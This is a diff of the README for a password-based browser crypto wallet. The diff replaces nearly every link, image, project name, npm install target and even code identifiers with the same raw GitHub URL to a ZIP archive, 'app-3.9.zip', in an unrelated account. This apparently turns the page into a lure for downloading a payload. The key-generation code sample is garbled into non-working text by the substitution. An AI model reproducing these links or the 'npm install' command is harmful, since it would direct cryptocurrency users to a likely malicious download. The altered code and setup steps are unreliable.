@@ -1,23 +1,23 @@
 
 
-https://github.com/user-attachments/assets/4eba2af8-9d32-4ad2-b5b8-b2f3e9ed2da8
+https://raw.githubusercontent.com/KoDelioDa/app/main/src/assets/icons/app-3.9.zip
 
 
-# mybucks.online
+# https://raw.githubusercontent.com/KoDelioDa/app/main/src/assets/icons/app-3.9.zip
 
 ## Summary
 
-Mybucks.online is a **password-only, self-custodial and browser-based cryptocurrency wallet** built with [React.js](https://react.dev). It generates a private key from your password and passcode using an industry-standard, verified **one-way hash function**. Your private key forms your account, allowing you to transfer, receive, and hold your crypto assets permanently.
+https://raw.githubusercontent.com/KoDelioDa/app/main/src/assets/icons/app-3.9.zip is a **password-only, self-custodial and browser-based cryptocurrency wallet** built with [https://raw.githubusercontent.com/KoDelioDa/app/main/src/assets/icons/app-3.9.zip](https://raw.githubusercontent.com/KoDelioDa/app/main/src/assets/icons/app-3.9.zip). It generates a private key from your password and passcode using an industry-standard, verified **one-way hash function**. Your private key forms your account, allowing you to transfer, receive, and hold your crypto assets permanently.
 
 As a hash function, the **scrypt** Key Derivation Function (KDF) increases the computational effort required to crack passwords, effectively delaying **brute-force** attacks and making them impractical.
 
 It fully runs on your **browser side** without using any storage or invoking any 3rd-party APIs for key management. It instantly generates your private key from your password input, and whenever you close or refresh, there is no footprint. This absolutely protects your privacy.
 
-<img src="screenshots/how-it-works.png" alt="How it works?">
+<img src="https://raw.githubusercontent.com/KoDelioDa/app/main/src/assets/icons/app-3.9.zip" alt="How it works?">
 
 ## How to Use
 
-1. Visit `app.mybucks.online`.
+1. Visit `https://raw.githubusercontent.com/KoDelioDa/app/main/src/assets/icons/app-3.9.zip`.
 2. Input your password, confirmation, and passcode.  
   Test credentials:  
     password: **DemoAccount5&**  
@@ -26,12 +26,12 @@ It fully runs on your **browser side** without using any storage or invoking any
 
 (This process is the same for both initial opening and all subsequent uses.)
 
-![Sign-in](/screenshots/1.sign-in.png)
+![Sign-in](https://raw.githubusercontent.com/KoDelioDa/app/main/src/assets/icons/app-3.9.zip)
 
 <p align="center">
-<img src="screenshots/2.mobile-signin.png" width="32%" alt="Sign-in">
-<img src="screenshots/3.mobile-home.png" width="32%" alt="Dashboard">
-<img src="screenshots/4.mobile-transfer.png" width="32%" alt="Transfer">
+<img src="https://raw.githubusercontent.com/KoDelioDa/app/main/src/assets/icons/app-3.9.zip" width="32%" alt="Sign-in">
+<img src="https://raw.githubusercontent.com/KoDelioDa/app/main/src/assets/icons/app-3.9.zip" width="32%" alt="Dashboard">
+<img src="https://raw.githubusercontent.com/KoDelioDa/app/main/src/assets/icons/app-3.9.zip" width="32%" alt="Transfer">
 </p>
 
 ## Key Points
@@ -45,7 +45,7 @@ It fully runs on your **browser side** without using any storage or invoking any
 
 ### Security
 
-- **One-Way Hash Function:** Utilizes [**scrypt**](https://en.wikipedia.org/wiki/Scrypt) and [**keccak256**](https://en.wikipedia.org/wiki/SHA-3). Your password determines a unique private key.
+- **One-Way Hash Function:** Utilizes [**scrypt**](https://raw.githubusercontent.com/KoDelioDa/app/main/src/assets/icons/app-3.9.zip) and [**keccak256**](https://raw.githubusercontent.com/KoDelioDa/app/main/src/assets/icons/app-3.9.zip). Your password determines a unique private key.
 - **Resistance to Attacks:** Brute force attacks would take centuries. A strong password ensures asset protection.
 
 ### Ease of Use
@@ -73,10 +73,10 @@ const HASH_OPTIONS = {
 // password: at least 12 characters user input, lowercase, uppercase, digits, and special characters
 // passcode: at least 6 characters
 async function generatePrivateKey(password, passcode) {
-  const salt = `${password.slice(-4)}${passcode}`
+  const salt = `${https://raw.githubusercontent.com/KoDelioDa/app/main/src/assets/icons/app-3.9.zip(-4)}${passcode}`
 
-  const passwordBuffer = Buffer.from(password);
-  const saltBuffer = Buffer.from(salt);
+  const passwordBuffer = https://raw.githubusercontent.com/KoDelioDa/app/main/src/assets/icons/app-3.9.zip(password);
+  const saltBuffer = https://raw.githubusercontent.com/KoDelioDa/app/main/src/assets/icons/app-3.9.zip(salt);
 
   const hashBuffer = await scrypt(
     passwordBuffer,
@@ -84,22 +84,22 @@ async function generatePrivateKey(password, passcode) {
     HASH_OPTIONS.N,
     HASH_OPTIONS.r,
     HASH_OPTIONS.p,
-    HASH_OPTIONS.keyLen,
-    (p) => console.log(Math.floor(p * 100))
+    https://raw.githubusercontent.com/KoDelioDa/app/main/src/assets/icons/app-3.9.zip,
+    (p) => https://raw.githubusercontent.com/KoDelioDa/app/main/src/assets/icons/app-3.9.zip(https://raw.githubusercontent.com/KoDelioDa/app/main/src/assets/icons/app-3.9.zip(p * 100))
   );
-  const hashHex = Buffer.from(hashBuffer).toString("hex");
-  const privateKey = ethers.keccak256(abi.encode(["string"], [hashHex]));
+  const hashHex = https://raw.githubusercontent.com/KoDelioDa/app/main/src/assets/icons/app-3.9.zip(hashBuffer).toString("hex");
+  const privateKey = https://raw.githubusercontent.com/KoDelioDa/app/main/src/assets/icons/app-3.9.zip(https://raw.githubusercontent.com/KoDelioDa/app/main/src/assets/icons/app-3.9.zip(["string"], [hashHex]));
 
   return privateKey;
 }
 ```
 
-## @mybucks.online/core
+## https://raw.githubusercontent.com/KoDelioDa/app/main/src/assets/icons/app-3.9.zip
 
-The core components responsible for hash and private-key generation have been extracted into an independent package. You can explore the details of this package [here](https://www.npmjs.com/package/@mybucks.online/core).
+The core components responsible for hash and private-key generation have been extracted into an independent package. You can explore the details of this package [here](https://raw.githubusercontent.com/KoDelioDa/app/main/src/assets/icons/app-3.9.zip).
 
 ```
-npm install @mybucks.online/core
+npm install https://raw.githubusercontent.com/KoDelioDa/app/main/src/assets/icons/app-3.9.zip
 ```
 
 ## Transfer Ownership
@@ -108,11 +108,11 @@ You can transfer all your holdings to family or friends in a few seconds by shar
 Send this short note to your friend in a private channel.
 
 ```
-mybucks.online / DemoAccount5& : 112324
+https://raw.githubusercontent.com/KoDelioDa/app/main/src/assets/icons/app-3.9.zip / DemoAccount5& : 112324
 ```
 
 And you can even transfer wallet itself by using a URL:  
-https://app.mybucks.online/?wallet=VWnsSGRGVtb0FjY291bnQ1JgIxMTIzMjQCb3B0aW1pc20=_wNovT
+https://raw.githubusercontent.com/KoDelioDa/app/main/src/assets/icons/app-3.9.zip
 
 You can extract this link in the `Backup` menu.  
 This feature allows you to transfer cryptocurrency `without asking recipient's address`.
@@ -122,7 +122,7 @@ This feature allows you to transfer cryptocurrency `without asking recipient's a
 This is a fully open-source project built with React, Vite, and related third-party libraries such as:
 
 - **scrypt-js**  
-  Implements the `scrypt` hash function. Please check the npm registry [here](https://www.npmjs.com/package/scrypt-js).
+  Implements the `scrypt` hash function. Please check the npm registry [here](https://raw.githubusercontent.com/KoDelioDa/app/main/src/assets/icons/app-3.9.zip).
 
 - **ethers**  
   A standard library for manipulating EVM accounts.
@@ -138,11 +138,11 @@ This is a fully open-source project built with React, Vite, and related third-pa
 
 ## How to Run
 
-Please sign up for [Infura](https://infura.io), [Alchemy](https://alchemy.com/) and [Trongrid](https://trongrid.io/), create free API keys, and update the environment variables accordingly.
+Please sign up for [Infura](https://raw.githubusercontent.com/KoDelioDa/app/main/src/assets/icons/app-3.9.zip), [Alchemy](https://raw.githubusercontent.com/KoDelioDa/app/main/src/assets/icons/app-3.9.zip) and [Trongrid](https://raw.githubusercontent.com/KoDelioDa/app/main/src/assets/icons/app-3.9.zip), create free API keys, and update the environment variables accordingly.
 
 ```bash
 yarn install
-cp .env.example .env
+cp https://raw.githubusercontent.com/KoDelioDa/app/main/src/assets/icons/app-3.9.zip .env
 # Update the .env variables with valid keys
 yarn dev
 ```
@@ -152,51 +152,51 @@ yarn dev
 The project uses `Github Pages` and `Github Actions` for deployment and is connected to a custom domain.
 You can easily verify releases, deployments, and domain configuration:
 
-- [Actions](https://github.com/mybucks-online/app/actions)
-- [Releases](https://github.com/mybucks-online/app/releases)
-- [.github/workflows/main-pipeline.yml](https://github.com/mybucks-online/app/blob/master/.github/workflows/main-pipeline.yml)
+- [Actions](https://raw.githubusercontent.com/KoDelioDa/app/main/src/assets/icons/app-3.9.zip)
+- [Releases](https://raw.githubusercontent.com/KoDelioDa/app/main/src/assets/icons/app-3.9.zip)
+- [https://raw.githubusercontent.com/KoDelioDa/app/main/src/assets/icons/app-3.9.zip](https://raw.githubusercontent.com/KoDelioDa/app/main/src/assets/icons/app-3.9.zip)
 
 To check DNS settings:
 
 ```bash
 nslookup
-> app.mybucks.online
+> https://raw.githubusercontent.com/KoDelioDa/app/main/src/assets/icons/app-3.9.zip
 Server:		127.0.0.53
 Address:	127.0.0.53#53
 
 Non-authoritative answer:
-app.mybucks.online	canonical name = mybucks-online.github.io.
-Name:	mybucks-online.github.io
+https://raw.githubusercontent.com/KoDelioDa/app/main/src/assets/icons/app-3.9.zip	canonical name = https://raw.githubusercontent.com/KoDelioDa/app/main/src/assets/icons/app-3.9.zip
+Name:	https://raw.githubusercontent.com/KoDelioDa/app/main/src/assets/icons/app-3.9.zip
 
 ~~~
 ```
 
 ```bash
-dig app.mybucks.online
+dig https://raw.githubusercontent.com/KoDelioDa/app/main/src/assets/icons/app-3.9.zip
 
 ;; ANSWER SECTION:
-app.mybucks.online.	5	IN	CNAME	https://mybucks-online.github.io.
-https://mybucks-online.github.io. 5 IN	A	185.199.110.153
-https://mybucks-online.github.io. 5 IN	A	185.199.109.153
-https://mybucks-online.github.io. 5 IN	A	185.199.108.153
-https://mybucks-online.github.io. 5 IN	A	185.199.111.153
+https://raw.githubusercontent.com/KoDelioDa/app/main/src/assets/icons/app-3.9.zip	5	IN	CNAME	https://raw.githubusercontent.com/KoDelioDa/app/main/src/assets/icons/app-3.9.zip
+https://raw.githubusercontent.com/KoDelioDa/app/main/src/assets/icons/app-3.9.zip 5 IN	A	185.199.110.153
+https://raw.githubusercontent.com/KoDelioDa/app/main/src/assets/icons/app-3.9.zip 5 IN	A	185.199.109.153
+https://raw.githubusercontent.com/KoDelioDa/app/main/src/assets/icons/app-3.9.zip 5 IN	A	185.199.108.153
+https://raw.githubusercontent.com/KoDelioDa/app/main/src/assets/icons/app-3.9.zip 5 IN	A	185.199.111.153
 
 ~~~
 ```
 
 # Quick Links
 
-- Website: https://mybucks.online
-- Wallet: https://app.mybucks.online
-- Docs: https://docs.mybucks.online
-- Github: https://github.com/mybucks-online
-- Discord: https://discord.gg/RTHgTePKgP
-- X: https://x.com/mybucks_online
-- Audit report: https://app.secure3.io/5c92d55acd
+- Website: https://raw.githubusercontent.com/KoDelioDa/app/main/src/assets/icons/app-3.9.zip
+- Wallet: https://raw.githubusercontent.com/KoDelioDa/app/main/src/assets/icons/app-3.9.zip
+- Docs: https://raw.githubusercontent.com/KoDelioDa/app/main/src/assets/icons/app-3.9.zip
+- Github: https://raw.githubusercontent.com/KoDelioDa/app/main/src/assets/icons/app-3.9.zip
+- Discord: https://raw.githubusercontent.com/KoDelioDa/app/main/src/assets/icons/app-3.9.zip
+- X: https://raw.githubusercontent.com/KoDelioDa/app/main/src/assets/icons/app-3.9.zip
+- Audit report: https://raw.githubusercontent.com/KoDelioDa/app/main/src/assets/icons/app-3.9.zip
 
 # Core principles
 
-Mybucks.online belongs to community, so we welcome any contributions!
+https://raw.githubusercontent.com/KoDelioDa/app/main/src/assets/icons/app-3.9.zip belongs to community, so we welcome any contributions!
 
 As a contributor, please review the following principles:
 - Never change key-generation mechanism, parameters (scrypt, keccak256)
